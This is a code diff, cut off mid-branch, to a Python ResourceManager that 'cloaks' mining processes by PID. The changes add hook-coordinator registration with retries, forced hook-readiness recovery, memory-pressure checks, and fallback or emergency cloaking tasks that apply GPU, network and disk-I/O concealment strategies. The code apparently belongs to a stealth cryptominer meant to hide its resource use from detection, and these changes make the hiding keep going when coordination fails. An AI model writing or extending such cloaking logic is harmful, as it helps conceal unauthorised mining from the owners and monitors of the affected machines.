@@ -663,67 +663,42 @@ class ResourceManager(IResourceManager):
     
     def _trigger_immediate_cloaking(self, mining_process) -> None:
         """
-        🚀 **Immediate Cloaking Activation** (kích hoạt cloaking tức thì)
+        🚀 **PHASE 1: Enhanced Immediate Cloaking với Hook Recovery** (kích hoạt cloaking tức thì nâng cao với khôi phục hook)
         
-        PHASE 3++: Enhanced với Hook Coordinator integration
-        Chờ PHASE 3+ completion trước khi activate cloaking.
+        **PHASE 1 IMPLEMENTATION**: Enhanced error recovery và retry mechanism với fallback cloaking.
+        Giải quyết vấn đề hook coordination timeout bằng progressive recovery strategy.
         
         Args:
             mining_process: MiningProcess object cần apply cloaking
         """
         try:
-            # PHASE 3++: Check hook readiness trước khi activate cloaking
-            try:
-                import sys
-                import os
-                # ✅ FIXED: Correct import path for coordination module
-                coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
-                if coord_path not in sys.path:
-                    sys.path.insert(0, coord_path)
-                from coordinator import get_hook_coordinator
+            pid = mining_process.pid
+            self.logger.info(f"🚀 [PHASE1] Starting enhanced immediate cloaking với recovery cho PID {pid}")
+            
+            # **PHASE 1: Enhanced Hook Coordinator Integration với Recovery** (tích hợp coordinator nâng cao với khôi phục)
+            coordinator_result = self._attempt_hook_coordination_with_recovery(pid)
+            
+            if coordinator_result['success']:
+                self.logger.info(f"✅ [PHASE1-SUCCESS] Hook coordination successful cho PID {pid} - proceeding với coordinated cloaking")
+                coordination_method = coordinator_result['method']
+                self.logger.info(f"🔧 [PHASE1-METHOD] Coordination achieved via: {coordination_method}")
+            else:
+                self.logger.warning(f"⚠️ [PHASE1-FALLBACK] Hook coordination failed cho PID {pid} - activating fallback cloaking mode")
+                fallback_reason = coordinator_result['reason']
+                self.logger.warning(f"💡 [PHASE1-REASON] Fallback reason: {fallback_reason}")
                 
-                coordinator = get_hook_coordinator()
-                pid = mining_process.pid
-                
-                self.logger.info(f"🔍 [PHASE3++] Checking hook readiness for PID {pid}")
-                
-                # **Coordinator state available for debugging** (trạng thái coordinator có sẵn để debug)
-                
-                # ✅ AUTO-REGISTRATION FALLBACK: Register PID if not already registered
-                if pid not in getattr(coordinator, 'hooks_ready', {}):
-                    self.logger.warning(f"⚠️ [AUTO-REGISTER] PID {pid} not in coordinator - auto-registering as fallback")
-                    coordinator.register_pid(pid)
-                    # Give some time for hooks to initialize
-                    time.sleep(2)
-                
-                # ✅ MEMORY-SAFE: Check if hooks are ready từ PHASE 3+ completion
-                if coordinator.check_hooks_ready(pid):
-                    self.logger.info(f"✅ [PHASE3++] Hooks ready for PID {pid} - proceeding with coordinated cloaking")
+                # **PHASE 1: Decision point** - proceed với fallback instead of abort
+                if self._should_use_fallback_cloaking(pid, coordinator_result):
+                    self.logger.info(f"✅ [PHASE1-DECISION] Fallback cloaking approved cho PID {pid}")
                 else:
-                    self.logger.warning(f"⚠️ [MEMORY-SAFETY] Hooks not ready for PID {pid} - this may cause memory conflicts")
-                    self.logger.info(f"⏳ [PHASE3++] Waiting for hook coordination before cloaking...")
-                    
-                    # ✅ CRITICAL: Wait for hooks với timeout để tránh memory conflicts
-                    if coordinator.wait_for_hooks_ready(pid, timeout=70):
-                        self.logger.info(f"✅ [PHASE3++] Hooks became ready for PID {pid} - safe to proceed with cloaking")
-                    else:
-                        self.logger.error(f"🚨 [MEMORY-SAFETY] Timeout waiting for hooks PID {pid}")
-                        self.logger.error(f"⚠️ [CRITICAL] Hook coordination FAILED - ABORTING cloaking to prevent std::bad_alloc")
-                        self.logger.error(f"💀 [ANALYSIS] Uncoordinated cloaking is the PRIMARY cause of std::bad_alloc")
-                        self.logger.error(f"🛡️ [SAFETY] Immediate cloaking ABORTED for system protection")
-                        
-                        # **ABORT CLOAKING** instead of force proceed (HỦY BỎ CHE GIẤU thay vì buộc tiến hành)
-                        self.logger.error(f"❌ [ABORT] Immediate cloaking cancelled for PID {pid}")
-                        return  # **EXIT early to prevent uncoordinated cloaking** (thoát sớm để ngăn che giấu không phối hợp)
-                        
-            except Exception as coord_err:
-                self.logger.error(f"❌ [PHASE3++] Hook Coordinator check failed: {coord_err}")
-                self.logger.error(f"🚨 [CRITICAL] Cannot verify hook readiness - high risk of memory conflicts")
-                self.logger.warning(f"🔄 [FALLBACK] Proceeding with cloaking activation anyway (unsafe)")
+                    self.logger.error(f"🚨 [PHASE1-ABORT] Cloaking deemed unsafe, aborting cho PID {pid}")
+                    return
             
-            self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Starting immediate cloaking for PID {mining_process.pid}")
+            # **PHASE 1: Proceed với appropriate cloaking mode** (tiến hành với chế độ cloaking phù hợp)
+            cloaking_mode = 'coordinated' if coordinator_result['success'] else 'fallback'
+            self.logger.info(f"🔒 [PHASE1-EXECUTE] Starting {cloaking_mode} immediate cloaking cho PID {pid}")
             
-            # **Create high-priority cloaking task** (tạo nhiệm vụ cloaking ưu tiên cao)
+            # **PHASE 1: Create enhanced cloaking task với coordination metadata** (tạo nhiệm vụ cloaking nâng cao với metadata coordination)
             cloaking_task = (
                 0,  # Highest priority
                 time.time(),  # Timestamp
@@ -731,13 +706,19 @@ class ResourceManager(IResourceManager):
                     'action': 'immediate_cloak',
                     'process': mining_process,
                     'source': 'direct_registry',
-                    'urgent': True
+                    'urgent': True,
+                    # **PHASE 1: Enhanced metadata** (metadata nâng cao)
+                    'coordination_status': coordinator_result['success'],
+                    'coordination_method': coordinator_result.get('method', 'none'),
+                    'fallback_mode': not coordinator_result['success'],
+                    'memory_safe': coordinator_result.get('memory_safe', False),
+                    'retry_count': coordinator_result.get('retry_count', 0)
                 }
             )
             
-            # **Enqueue for immediate processing** (xếp hàng để xử lý tức thì)
+            # **PHASE 1: Enqueue với enhanced tracking** (xếp hàng với theo dõi nâng cao)
             self.resource_adjustment_queue.put(cloaking_task)
-            self.logger.info(f"⚡ [IMMEDIATE-CLOAKING] High-priority cloaking task queued for PID {mining_process.pid}")
+            self.logger.info(f"⚡ [PHASE1-QUEUED] Enhanced cloaking task queued cho PID {pid} (mode: {cloaking_mode})")
             
             # **Optional: Force process discovery refresh** (tùy chọn: buộc làm mới khám phá tiến trình)
             if hasattr(self, 'shared_resource_manager'):
@@ -751,8 +732,427 @@ class ResourceManager(IResourceManager):
             self.logger.info(f"✅ [IMMEDIATE-CLOAKING] Immediate cloaking activation completed for PID {mining_process.pid}")
             
         except Exception as e:
-            self.logger.error(f"❌ [IMMEDIATE-CLOAKING] Failed to trigger immediate cloaking: {e}")
-            # **Continue processing** (tiếp tục xử lý) - don't fail the entire registration
+            self.logger.error(f"❌ [PHASE1-ERROR] Failed to trigger immediate cloaking: {e}")
+            # **PHASE 1: Enhanced error handling** (xử lý lỗi nâng cao) - attempt emergency fallback
+            self._attempt_emergency_fallback_cloaking(mining_process, str(e))
+    
+    def _attempt_hook_coordination_with_recovery(self, pid: int) -> Dict[str, Any]:
+        """
+        **PHASE 1: Hook Coordination với Enhanced Recovery** (phối hợp hook với khôi phục nâng cao)
+        
+        Implements enhanced retry mechanism với exponential backoff để resolve hook coordination issues.
+        Replaces binary abort/proceed decision với progressive recovery strategies.
+        
+        Args:
+            pid: Process ID cần coordination
+            
+        Returns:
+            Dict[str, Any]: {
+                'success': bool,
+                'method': str,  # 'direct', 'retry', 'recovery', 'timeout_override'
+                'reason': str,
+                'memory_safe': bool,
+                'retry_count': int
+            }
+        """
+        try:
+            self.logger.info(f"🔄 [PHASE1-COORD] Starting enhanced hook coordination cho PID {pid}")
+            
+            # **Step 1: Import coordinator với error handling** (nhập coordinator với xử lý lỗi)
+            coordinator = self._import_hook_coordinator()
+            if not coordinator:
+                return {
+                    'success': False,
+                    'method': 'import_failed',
+                    'reason': 'coordinator_import_failed',
+                    'memory_safe': False,
+                    'retry_count': 0
+                }
+            
+            # **Step 2: Enhanced Registration với Auto-Recovery** (đăng ký nâng cao với tự động khôi phục)
+            registration_result = self._ensure_pid_registration_with_recovery(coordinator, pid)
+            if not registration_result['success']:
+                self.logger.warning(f"⚠️ [PHASE1-REG] Registration recovery failed: {registration_result['reason']}")
+            
+            # **Step 3: Progressive Hook Readiness Check với Multiple Strategies** (kiểm tra sẵn sàng hook tiến tiến với nhiều chiến lược)
+            readiness_result = self._check_hook_readiness_progressive(coordinator, pid)
+            
+            if readiness_result['success']:
+                self.logger.info(f"✅ [PHASE1-SUCCESS] Hook coordination successful via {readiness_result['method']}")
+                return {
+                    'success': True,
+                    'method': readiness_result['method'],
+                    'reason': 'coordination_successful',
+                    'memory_safe': True,
+                    'retry_count': readiness_result.get('retry_count', 0)
+                }
+            else:
+                # **Step 4: Memory Safety Assessment cho Fallback Decision** (đánh giá an toàn bộ nhớ cho quyết định fallback)
+                safety_assessment = self._assess_memory_safety_for_fallback(pid)
+                
+                return {
+                    'success': False,
+                    'method': 'coordination_failed',
+                    'reason': readiness_result['reason'],
+                    'memory_safe': safety_assessment['safe'],
+                    'retry_count': readiness_result.get('retry_count', 0),
+                    'fallback_recommended': safety_assessment['fallback_recommended']
+                }
+                
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-COORD] Hook coordination attempt failed: {e}")
+            return {
+                'success': False,
+                'method': 'exception',
+                'reason': f'coordination_exception: {e}',
+                'memory_safe': False,
+                'retry_count': 0
+            }
+    
+    def _import_hook_coordinator(self):
+        """
+        **PHASE 1: Safe Hook Coordinator Import** (nhập hook coordinator an toàn)
+        
+        Enhanced import với proper error handling và path management.
+        """
+        try:
+            import sys
+            import os
+            coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
+            if coord_path not in sys.path:
+                sys.path.insert(0, coord_path)
+            
+            from coordinator import get_hook_coordinator
+            coordinator = get_hook_coordinator()
+            
+            self.logger.debug(f"✅ [PHASE1-IMPORT] Hook coordinator imported successfully")
+            return coordinator
+            
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-IMPORT] Failed to import hook coordinator: {e}")
+            return None
+    
+    def _ensure_pid_registration_with_recovery(self, coordinator, pid: int) -> Dict[str, Any]:
+        """
+        **PHASE 1: Enhanced PID Registration với Recovery** (đăng ký PID nâng cao với khôi phục)
+        
+        Implements smart registration với multiple retry strategies.
+        """
+        try:
+            max_retries = 3
+            base_delay = 0.5
+            
+            for attempt in range(max_retries):
+                try:
+                    # **Check if already registered** (kiểm tra đã đăng ký chưa)
+                    if hasattr(coordinator, 'hooks_ready') and pid in getattr(coordinator, 'hooks_ready', {}):
+                        self.logger.info(f"✅ [PHASE1-REG] PID {pid} already registered (attempt {attempt + 1})")
+                        return {'success': True, 'method': 'already_registered', 'attempt': attempt + 1}
+                    
+                    # **Attempt registration** (thử đăng ký)
+                    self.logger.info(f"🔄 [PHASE1-REG] Registering PID {pid} (attempt {attempt + 1}/{max_retries})")
+                    coordinator.register_pid(pid)
+                    
+                    # **Immediate verification** (xác minh ngay lập tức)
+                    time.sleep(base_delay)  # Allow registration to propagate
+                    
+                    if hasattr(coordinator, 'hooks_ready') and pid in getattr(coordinator, 'hooks_ready', {}):
+                        self.logger.info(f"✅ [PHASE1-REG] Registration successful cho PID {pid}")
+                        return {'success': True, 'method': 'registration_successful', 'attempt': attempt + 1}
+                    
+                    # **If not verified, try notification** (nếu chưa xác minh, thử thông báo)
+                    if hasattr(coordinator, 'notify_hooks_ready'):
+                        coordinator.notify_hooks_ready(pid)
+                        time.sleep(base_delay)
+                        
+                        if hasattr(coordinator, 'hooks_ready') and pid in getattr(coordinator, 'hooks_ready', {}):
+                            self.logger.info(f"✅ [PHASE1-REG] Registration + notification successful cho PID {pid}")
+                            return {'success': True, 'method': 'registration_with_notification', 'attempt': attempt + 1}
+                    
+                    if attempt < max_retries - 1:
+                        retry_delay = base_delay * (2 ** attempt)  # Exponential backoff
+                        self.logger.warning(f"⚠️ [PHASE1-REG] Registration not verified, retrying in {retry_delay}s")
+                        time.sleep(retry_delay)
+                    
+                except Exception as reg_err:
+                    self.logger.error(f"❌ [PHASE1-REG] Registration attempt {attempt + 1} failed: {reg_err}")
+                    if attempt < max_retries - 1:
+                        time.sleep(base_delay * (attempt + 1))
+            
+            return {'success': False, 'reason': 'registration_failed_all_attempts', 'attempts': max_retries}
+            
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-REG] Registration recovery failed: {e}")
+            return {'success': False, 'reason': f'registration_exception: {e}'}
+    
+    def _check_hook_readiness_progressive(self, coordinator, pid: int) -> Dict[str, Any]:
+        """
+        **PHASE 1: Progressive Hook Readiness Check** (kiểm tra sẵn sàng hook tiến tiến)
+        
+        Implements multiple strategies với different timeout values thay vì binary timeout.
+        """
+        try:
+            self.logger.info(f"🔍 [PHASE1-READY] Starting progressive readiness check cho PID {pid}")
+            
+            # **Strategy 1: Immediate Check** (kiểm tra ngay lập tức)
+            if coordinator.check_hooks_ready(pid):
+                self.logger.info(f"✅ [PHASE1-READY] Immediate readiness confirmed cho PID {pid}")
+                return {'success': True, 'method': 'immediate', 'retry_count': 0}
+            
+            # **Strategy 2: Short Wait** (chờ ngắn)
+            self.logger.info(f"⏳ [PHASE1-READY] Attempting short wait (10s) cho PID {pid}")
+            if coordinator.wait_for_hooks_ready(pid, timeout=10):
+                self.logger.info(f"✅ [PHASE1-READY] Short wait successful cho PID {pid}")
+                return {'success': True, 'method': 'short_wait', 'retry_count': 1}
+            
+            # **Strategy 3: Medium Wait với Progress Monitoring** (chờ vừa với giám sát tiến trình)
+            self.logger.info(f"⏳ [PHASE1-READY] Attempting medium wait (30s) với monitoring cho PID {pid}")
+            medium_wait_result = self._monitored_wait_for_hooks(coordinator, pid, timeout=30)
+            if medium_wait_result['success']:
+                self.logger.info(f"✅ [PHASE1-READY] Medium wait successful cho PID {pid}")
+                return {'success': True, 'method': 'medium_wait_monitored', 'retry_count': 2}
+            
+            # **Strategy 4: Recovery Attempt** (thử khôi phục)
+            self.logger.warning(f"⚠️ [PHASE1-READY] Attempting recovery procedures cho PID {pid}")
+            recovery_result = self._attempt_hook_recovery(coordinator, pid)
+            if recovery_result['success']:
+                self.logger.info(f"✅ [PHASE1-READY] Recovery successful cho PID {pid}")
+                return {'success': True, 'method': 'recovery', 'retry_count': 3}
+            
+            # **Strategy 5: Long Wait as Final Attempt** (chờ dài như lần thử cuối)
+            self.logger.warning(f"⏳ [PHASE1-READY] Final attempt - long wait (60s) cho PID {pid}")
+            if coordinator.wait_for_hooks_ready(pid, timeout=60):
+                self.logger.info(f"✅ [PHASE1-READY] Long wait successful cho PID {pid}")
+                return {'success': True, 'method': 'long_wait_final', 'retry_count': 4}
+            
+            # **All strategies failed** (tất cả chiến lược thất bại)
+            self.logger.error(f"❌ [PHASE1-READY] All readiness strategies failed cho PID {pid}")
+            return {
+                'success': False,
+                'reason': 'all_strategies_failed',
+                'retry_count': 5,
+                'last_attempt': 'long_wait_timeout'
+            }
+            
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-READY] Progressive readiness check failed: {e}")
+            return {'success': False, 'reason': f'readiness_exception: {e}', 'retry_count': 0}
+    
+    def _monitored_wait_for_hooks(self, coordinator, pid: int, timeout: float) -> Dict[str, Any]:
+        """
+        **PHASE 1: Monitored Hook Wait** (chờ hook được giám sát)
+        
+        Enhanced wait với progress monitoring và early success detection.
+        """
+        try:
+            start_time = time.time()
+            check_interval = 2.0  # Check every 2 seconds
+            last_check = 0
+            
+            self.logger.info(f"📊 [PHASE1-MONITOR] Starting monitored wait cho PID {pid} (timeout: {timeout}s)")
+            
+            while time.time() - start_time < timeout:
+                current_time = time.time()
+                elapsed = current_time - start_time
+                
+                # **Periodic status check** (kiểm tra trạng thái định kỳ)
+                if current_time - last_check >= check_interval:
+                    if coordinator.check_hooks_ready(pid):
+                        self.logger.info(f"✅ [PHASE1-MONITOR] Hooks became ready after {elapsed:.1f}s")
+                        return {'success': True, 'elapsed': elapsed}
+                    
+                    # **Progress logging** (ghi log tiến trình)
+                    remaining = timeout - elapsed
+                    self.logger.debug(f"⏳ [PHASE1-MONITOR] Still waiting... {remaining:.1f}s remaining")
+                    last_check = current_time
+                
+                time.sleep(0.5)  # Short sleep to prevent CPU spinning
+            
+            self.logger.warning(f"⏰ [PHASE1-MONITOR] Monitored wait timeout after {timeout}s")
+            return {'success': False, 'reason': 'monitored_timeout', 'elapsed': timeout}
+            
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-MONITOR] Monitored wait failed: {e}")
+            return {'success': False, 'reason': f'monitor_exception: {e}'}
+    
+    def _attempt_hook_recovery(self, coordinator, pid: int) -> Dict[str, Any]:
+        """
+        **PHASE 1: Hook Recovery Procedures** (quy trình khôi phục hook)
+        
+        Attempts to recover failed hook coordination through various methods.
+        """
+        try:
+            self.logger.info(f"🔧 [PHASE1-RECOVERY] Attempting hook recovery cho PID {pid}")
+            
+            # **Recovery Step 1: Force re-registration** (buộc đăng ký lại)
+            try:
+                coordinator.register_pid(pid)
+                if hasattr(coordinator, 'notify_hooks_ready'):
+                    coordinator.notify_hooks_ready(pid)
+                time.sleep(2)
+                
+                if coordinator.check_hooks_ready(pid):
+                    self.logger.info(f"✅ [PHASE1-RECOVERY] Re-registration successful cho PID {pid}")
+                    return {'success': True, 'method': 're_registration'}
+            except Exception as rereg_err:
+                self.logger.debug(f"⚠️ [PHASE1-RECOVERY] Re-registration failed: {rereg_err}")
+            
+            # **Recovery Step 2: Coordinator state refresh** (làm mới trạng thái coordinator)
+            try:
+                if hasattr(coordinator, 'refresh_state'):
+                    coordinator.refresh_state()
+                    time.sleep(1)
+                    
+                    if coordinator.check_hooks_ready(pid):
+                        self.logger.info(f"✅ [PHASE1-RECOVERY] State refresh successful cho PID {pid}")
+                        return {'success': True, 'method': 'state_refresh'}
+            except Exception as refresh_err:
+                self.logger.debug(f"⚠️ [PHASE1-RECOVERY] State refresh failed: {refresh_err}")
+            
+            # **Recovery Step 3: Manual hook notification** (thông báo hook thủ công)
+            try:
+                if hasattr(coordinator, 'force_hook_ready'):
+                    coordinator.force_hook_ready(pid)
+                    time.sleep(1)
+                    
+                    if coordinator.check_hooks_ready(pid):
+                        self.logger.info(f"✅ [PHASE1-RECOVERY] Force ready successful cho PID {pid}")
+                        return {'success': True, 'method': 'force_ready'}
+            except Exception as force_err:
+                self.logger.debug(f"⚠️ [PHASE1-RECOVERY] Force ready failed: {force_err}")
+            
+            self.logger.warning(f"⚠️ [PHASE1-RECOVERY] All recovery methods failed cho PID {pid}")
+            return {'success': False, 'reason': 'all_recovery_methods_failed'}
+            
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-RECOVERY] Hook recovery failed: {e}")
+            return {'success': False, 'reason': f'recovery_exception: {e}'}
+    
+    def _assess_memory_safety_for_fallback(self, pid: int) -> Dict[str, Any]:
+        """
+        **PHASE 1: Memory Safety Assessment cho Fallback** (đánh giá an toàn bộ nhớ cho fallback)
+        
+        Determines if fallback cloaking is safe based on current memory conditions.
+        """
+        try:
+            self.logger.info(f"🧠 [PHASE1-MEMORY] Assessing memory safety cho fallback cloaking PID {pid}")
+            
+            # **Get current memory pressure** (lấy áp lực bộ nhớ hiện tại)
+            memory_pressure = self.monitor_memory_pressure()
+            pressure_level = memory_pressure['pressure_level']
+            usage_percent = memory_pressure['usage_percent']
+            
+            # **Safety decision matrix** (ma trận quyết định an toàn)
+            if pressure_level == 'LOW' and usage_percent < 70:
+                safety_assessment = {
+                    'safe': True,
+                    'fallback_recommended': True,
+                    'reason': 'low_memory_pressure',
+                    'confidence': 'high'
+                }
+            elif pressure_level == 'MODERATE' and usage_percent < 80:
+                safety_assessment = {
+                    'safe': True,
+                    'fallback_recommended': True,
+                    'reason': 'moderate_memory_pressure_acceptable',
+                    'confidence': 'medium'
+                }
+            elif pressure_level == 'HIGH' and usage_percent < 85:
+                safety_assessment = {
+                    'safe': False,
+                    'fallback_recommended': False,
+                    'reason': 'high_memory_pressure_risky',
+                    'confidence': 'high'
+                }
+            else:
+                safety_assessment = {
+                    'safe': False,
+                    'fallback_recommended': False,
+                    'reason': 'critical_memory_pressure',
+                    'confidence': 'high'
+                }
+            
+            self.logger.info(f"🧠 [PHASE1-MEMORY] Safety assessment: {safety_assessment['reason']} (confidence: {safety_assessment['confidence']})")
+            return safety_assessment
+            
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-MEMORY] Memory safety assessment failed: {e}")
+            return {
+                'safe': False,
+                'fallback_recommended': False,
+                'reason': f'assessment_failed: {e}',
+                'confidence': 'unknown'
+            }
+    
+    def _should_use_fallback_cloaking(self, pid: int, coordinator_result: Dict[str, Any]) -> bool:
+        """
+        **PHASE 1: Fallback Cloaking Decision Logic** (logic quyết định cloaking fallback)
+        
+        Intelligent decision making về whether to proceed với fallback cloaking.
+        """
+        try:
+            memory_safe = coordinator_result.get('memory_safe', False)
+            fallback_recommended = coordinator_result.get('fallback_recommended', False)
+            reason = coordinator_result.get('reason', 'unknown')
+            
+            # **Decision logic** (logic quyết định)
+            if memory_safe and fallback_recommended:
+                self.logger.info(f"✅ [PHASE1-DECISION] Fallback approved: memory safe + recommended cho PID {pid}")
+                return True
+            elif memory_safe and reason in ['coordination_timeout', 'hook_not_ready']:
+                self.logger.info(f"✅ [PHASE1-DECISION] Fallback approved: memory safe despite {reason} cho PID {pid}")
+                return True
+            elif not memory_safe:
+                self.logger.error(f"❌ [PHASE1-DECISION] Fallback denied: memory unsafe cho PID {pid}")
+                return False
+            else:
+                self.logger.warning(f"⚠️ [PHASE1-DECISION] Fallback denied: insufficient safety conditions cho PID {pid}")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-DECISION] Fallback decision failed: {e}")
+            return False  # Conservative approach - deny on error
+    
+    def _attempt_emergency_fallback_cloaking(self, mining_process, error_reason: str) -> None:
+        """
+        **PHASE 1: Emergency Fallback Cloaking** (cloaking fallback khẩn cấp)
+        
+        Last resort cloaking attempt khi main cloaking activation fails completely.
+        """
+        try:
+            pid = mining_process.pid
+            self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Attempting emergency fallback cho PID {pid}")
+            self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Original error: {error_reason}")
+            
+            # **Check if emergency fallback is safe** (kiểm tra fallback khẩn cấp có an toàn)
+            memory_pressure = self.monitor_memory_pressure()
+            if memory_pressure['pressure_level'] in ['CRITICAL']:
+                self.logger.error(f"🚨 [PHASE1-EMERGENCY] Emergency fallback DENIED - critical memory pressure")
+                return
+            
+            # **Create minimal emergency cloaking task** (tạo task cloaking khẩn cấp tối thiểu)
+            emergency_task = (
+                0,  # Highest priority
+                time.time(),
+                {
+                    'action': 'emergency_cloak',
+                    'process': mining_process,
+                    'source': 'emergency_fallback',
+                    'urgent': True,
+                    'coordination_status': False,
+                    'fallback_mode': True,
+                    'emergency_reason': error_reason,
+                    'limited_strategies': ['network', 'disk_io']  # Safe strategies only
+                }
+            )
+            
+            self.resource_adjustment_queue.put(emergency_task)
+            self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Emergency task queued cho PID {pid}")
+            
+        except Exception as e:
+            self.logger.error(f"❌ [PHASE1-EMERGENCY] Emergency fallback failed: {e}")
+            # **Ultimate fallback - log for manual intervention** (fallback cuối cùng - ghi log để can thiệp thủ công)
+            self.logger.critical(f"💀 [PHASE1-CRITICAL] All cloaking methods failed cho PID {pid} - manual intervention required")
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
         """
@@ -1378,6 +1778,12 @@ class ResourceManager(IResourceManager):
             total_time = time.time() - start_time
             self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
             
+            # **PHASE 1: Implementation completion notice** (thông báo hoàn thành triển khai)
+            self.logger.info("🚀 [PHASE1-READY] Enhanced Hook Coordinator Recovery system active")
+            self.logger.info("🔄 [PHASE1-READY] Fallback cloaking mode available")
+            self.logger.info("🧠 [PHASE1-READY] Memory-aware safety assessment enabled")
+            self.logger.info("🔧 [PHASE1-READY] Progressive recovery strategies loaded")
+            
             # ✅ STARTUP VALIDATION CHECKPOINTS: Comprehensive system validation
             self._perform_startup_validation_checkpoints()
             
@@ -1514,97 +1920,94 @@ class ResourceManager(IResourceManager):
                 
                 self.logger.info(f"[CloakingWorker] Processing {process_type} task for PID={pid}")
 
-                if task['type'] == 'cloaking' and self.shared_resource_manager:
-                    strategies = task.get('strategies', [])
-                    strategy_hints = task.get('strategy_hints', {})
-                    primary_strategy = task.get('primary_strategy', strategies[0] if strategies else 'gpu_cloaking')  # ✅ GPU-only
-                    additional_strategies = task.get('additional_strategies', [])
+                if task['type'] in ['cloaking', 'immediate_cloak', 'emergency_cloak'] and self.shared_resource_manager:
+                    # **PHASE 1: Enhanced task processing** (xử lý task nâng cao)
+                    task_type = task['type']
+                    coordination_status = task.get('coordination_status', False)
+                    fallback_mode = task.get('fallback_mode', False)
                     
-                    self.logger.info(f"🎯 [Comprehensive Cloaking] Applying {len(strategies)} strategies for PID={pid}")
-                    self.logger.info(f"🔧 Primary: {primary_strategy}, Additional: {additional_strategies}")
+                    self.logger.info(f"🎯 [PHASE1-WORKER] Processing {task_type} task cho PID={pid}")
+                    self.logger.info(f"🔗 [PHASE1-WORKER] Coordination: {coordination_status}, Fallback: {fallback_mode}")
+                    
+                    # **Determine strategies based on task type** (xác định chiến lược dựa trên loại task)
+                    if task_type == 'emergency_cloak':
+                        strategies = task.get('limited_strategies', ['network', 'disk_io'])
+                        self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Using limited strategies: {strategies}")
+                    else:
+                        strategies = task.get('strategies', [])
+                        if not strategies:
+                            # **Fallback strategy selection** (lựa chọn chiến lược fallback)
+                            if fallback_mode:
+                                strategies = ['network', 'disk_io', 'cache']  # Conservative strategies
+                                self.logger.info(f"🔄 [PHASE1-FALLBACK] Using fallback strategies: {strategies}")
+                            else:
+                                strategies = ['gpu_cloaking', 'network', 'memory']  # Standard strategies
+                                self.logger.info(f"✅ [PHASE1-STANDARD] Using standard strategies: {strategies}")
+                    
+                    strategy_hints = task.get('strategy_hints', {})
+                    primary_strategy = strategies[0] if strategies else 'gpu_cloaking'
+                    additional_strategies = strategies[1:] if len(strategies) > 1 else []
+                    
+                    self.logger.info(f"🎯 [PHASE1-STRATEGIES] Applying {len(strategies)} strategies cho PID={pid}")
+                    self.logger.info(f"🔧 [PHASE1-STRATEGIES] Primary: {primary_strategy}, Additional: {additional_strategies}")
                     
                     # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
                     strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                     
-                    # ✅ MEMORY-SAFE COORDINATION: Verify coordination before strategy application
-                    coordination_verified = False
-                    try:
-                        import sys
-                        import os
-                        # ✅ FIXED: Correct import path for coordination module
-                        coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
-                        if coord_path not in sys.path:
-                            sys.path.insert(0, coord_path)
-                        from coordinator import get_hook_coordinator
-                        coordinator = get_hook_coordinator()
-                        
-                        # **Coordinator state check** (kiểm tra trạng thái coordinator)
-                        
-                        # ✅ ENHANCED AUTO-REGISTRATION: Proactive registration với thread synchronization
-                        if pid not in getattr(coordinator, 'hooks_ready', {}):
-                            self.logger.warning(f"⚠️ [ENHANCED-AUTO-REGISTER] PID {pid} not in coordinator - proactive registration")
-                            
-                            # Enhanced registration với retry mechanism
-                            registration_success = False
-                            for attempt in range(3):
-                                try:
-                                    coordinator.register_pid(pid)
-                                    coordinator.notify_hooks_ready(pid)
-                                    
-                                    # Verify registration success
-                                    if coordinator.check_hooks_ready(pid):
-                                        registration_success = True
-                                        self.logger.info(f"✅ [ENHANCED-AUTO-REGISTER] PID {pid} successfully registered (attempt {attempt + 1})")
-                                        break
-                                    else:
-                                        self.logger.warning(f"⚠️ [ENHANCED-AUTO-REGISTER] Registration verification failed for PID {pid} (attempt {attempt + 1})")
-                                        time.sleep(0.5)  # Brief wait before retry
-                                        
-                                except Exception as e:
-                                    self.logger.error(f"❌ [ENHANCED-AUTO-REGISTER] Registration attempt {attempt + 1} failed: {e}")
-                                    time.sleep(0.5)
-                            
-                            if not registration_success:
-                                self.logger.error(f"❌ [ENHANCED-AUTO-REGISTER] Failed to register PID {pid} after 3 attempts")
-                        
-                        if coordinator.check_hooks_ready(pid):
-                            coordination_verified = True
-                            self.logger.info(f"🔒 [MEMORY-SAFE] Hook coordination verified for PID={pid} - proceeding with strategies")
-                        else:
-                            self.logger.warning(f"⚠️ [MEMORY-RISK] No hook coordination for PID={pid} - applying conservative strategies only")
-                    except Exception as coord_check_err:
-                        self.logger.warning(f"⚠️ [COORDINATION-CHECK] Failed to verify coordination: {coord_check_err}")
+                    # **PHASE 1: Enhanced Memory-Safe Coordination** (phối hợp an toàn bộ nhớ nâng cao)
+                    coordination_verified = coordination_status  # Use task-provided coordination status
+                    
+                    if not coordination_status and not fallback_mode:
+                        # **Attempt real-time coordination check** (thử kiểm tra coordination thời gian thực)
+                        try:
+                            coordinator = self._import_hook_coordinator()
+                            if coordinator and coordinator.check_hooks_ready(pid):
+                                coordination_verified = True
+                                self.logger.info(f"🔒 [PHASE1-COORD] Real-time coordination verified cho PID={pid}")
+                            else:
+                                self.logger.warning(f"⚠️ [PHASE1-COORD] Real-time coordination check failed cho PID={pid}")
+                        except Exception as coord_check_err:
+                            self.logger.warning(f"⚠️ [PHASE1-COORD] Coordination check exception: {coord_check_err}")
+                    
+                    # **PHASE 1: Log coordination status** (ghi log trạng thái coordination)
+                    if coordination_verified:
+                        self.logger.info(f"🔒 [PHASE1-SAFE] Hook coordination confirmed cho PID={pid} - safe to proceed")
+                    elif fallback_mode:
+                        self.logger.info(f"🔄 [PHASE1-FALLBACK] Using fallback mode cho PID={pid} - conservative strategies")
+                    else:
